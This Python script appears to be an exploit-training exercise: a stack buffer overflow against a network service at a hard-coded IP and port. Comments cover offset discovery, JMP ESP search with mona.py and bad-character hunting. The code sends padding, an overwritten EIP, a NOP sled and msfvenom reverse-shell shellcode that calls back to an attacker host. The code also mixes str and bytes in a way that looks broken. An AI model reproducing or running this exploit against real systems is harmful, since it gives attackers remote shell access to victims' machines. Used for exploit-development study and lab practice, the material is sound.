#!/usr/bin/env python3

# this is a modified script from the SEC4US - Dev Exploit Training by helviojunior aka M4v3r1ck

import sys
import socket
from struct import pack

host="192.168.249.141"  # modify this with your target data
port=7274               # modify this with your target data

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))

# concatenate all the strings as bytes with bÂ´<string>', w/o this you can send the data through the socket.

# Make the byte array to search the EIP 
# msf-pattern_create -l <BYTES> --->  payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A" 

# Find the EIP address in the bytearray to calc the offset
# msf-pattern_offset -q <EIP ADDRESS>

# search for a DLL for the own app/system and find the instruction JMP ESP
# DLL can not have ASLR enabled
# Use mona.py
# !mona jmp -r esp -n, this instruction will jump to ESP and there is where we will put our shellcode
# Find badchars using !mona
# mona config
# !mona config -get workingfolder
# !mona config -set workingfolder C:\monalogs\%p
# !mona bytearray
# !mona bytearray -cpb "\x00"   # every badchar you find you need to add here until find all of them for your app.
# !mona compare -f C:\monalogs\app_test\bytearray.bin -a 013FD378 # this is the address where the bytearray starts.


payload = "EXPLOIT1 " # specific string that need to pass to the vulnerable app in my case
offset = b"A" * 143
eip = pack('<L', 0x7274146F) # EIP address and convertion to little endian


""" default buffer for find badchars, this is a manually stuff, you must be patience and find one by one - Take a deap breath and wan on, wax off
buf = (
b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	) 
"""
# msfvenom -p windows/shell_reverse_tcp -a x86 -b '\x00' LHOST=<Attacker IP> LPORT=<Attacker Port> -f python

buf =  b""
buf += b"\xd9\xcf\xd9\x74\x24\xf4\xbb\xdb\xb2\x75\x2d\x5e"
buf += b"\x29\xc9\xb1\x52\x31\x5e\x17\x03\x5e\x17\x83\x1d"
buf += b"\xb6\x97\xd8\x5d\x5f\xd5\x23\x9d\xa0\xba\xaa\x78"
buf += b"\x91\xfa\xc9\x09\x82\xca\x9a\x5f\x2f\xa0\xcf\x4b"
buf += b"\xa4\xc4\xc7\x7c\x0d\x62\x3e\xb3\x8e\xdf\x02\xd2"
buf += b"\x0c\x22\x57\x34\x2c\xed\xaa\x35\x69\x10\x46\x67"
buf += b"\x22\x5e\xf5\x97\x47\x2a\xc6\x1c\x1b\xba\x4e\xc1"
buf += b"\xec\xbd\x7f\x54\x66\xe4\x5f\x57\xab\x9c\xe9\x4f"
buf += b"\xa8\x99\xa0\xe4\x1a\x55\x33\x2c\x53\x96\x98\x11"
buf += b"\x5b\x65\xe0\x56\x5c\x96\x97\xae\x9e\x2b\xa0\x75"
buf += b"\xdc\xf7\x25\x6d\x46\x73\x9d\x49\x76\x50\x78\x1a"
buf += b"\x74\x1d\x0e\x44\x99\xa0\xc3\xff\xa5\x29\xe2\x2f"
buf += b"\x2c\x69\xc1\xeb\x74\x29\x68\xaa\xd0\x9c\x95\xac"
buf += b"\xba\x41\x30\xa7\x57\x95\x49\xea\x3f\x5a\x60\x14"
buf += b"\xc0\xf4\xf3\x67\xf2\x5b\xa8\xef\xbe\x14\x76\xe8"
buf += b"\xc1\x0e\xce\x66\x3c\xb1\x2f\xaf\xfb\xe5\x7f\xc7"
buf += b"\x2a\x86\xeb\x17\xd2\x53\xbb\x47\x7c\x0c\x7c\x37"
buf += b"\x3c\xfc\x14\x5d\xb3\x23\x04\x5e\x19\x4c\xaf\xa5"
buf += b"\xca\xb3\x98\x5c\x89\x5c\xdb\x9e\xae\x67\x52\x78"
buf += b"\xc4\x87\x33\xd3\x71\x31\x1e\xaf\xe0\xbe\xb4\xca"
buf += b"\x23\x34\x3b\x2b\xed\xbd\x36\x3f\x9a\x4d\x0d\x1d"
buf += b"\x0d\x51\xbb\x09\xd1\xc0\x20\xc9\x9c\xf8\xfe\x9e"
buf += b"\xc9\xcf\xf6\x4a\xe4\x76\xa1\x68\xf5\xef\x8a\x28"
buf += b"\x22\xcc\x15\xb1\xa7\x68\x32\xa1\x71\x70\x7e\x95"
buf += b"\x2d\x27\x28\x43\x88\x91\x9a\x3d\x42\x4d\x75\xa9"
buf += b"\x13\xbd\x46\xaf\x1b\xe8\x30\x4f\xad\x45\x05\x70"
buf += b"\x02\x02\x81\x09\x7e\xb2\x6e\xc0\x3a\xc2\x24\x48"
buf += b"\x6a\x4b\xe1\x19\x2e\x16\x12\xf4\x6d\x2f\x91\xfc"
buf += b"\x0d\xd4\x89\x75\x0b\x90\x0d\x66\x61\x89\xfb\x88"
buf += b"\xd6\xaa\x29"

esp = b"\x90" * 16 # NOP sled 
esp += buf

payload +=  offset + eip + esp

print (f"Enviando exploit {len(payload)} bytes..") 

# print (f"Debug - Payload -> {payload}")

exp.send(payload)

exp.close()
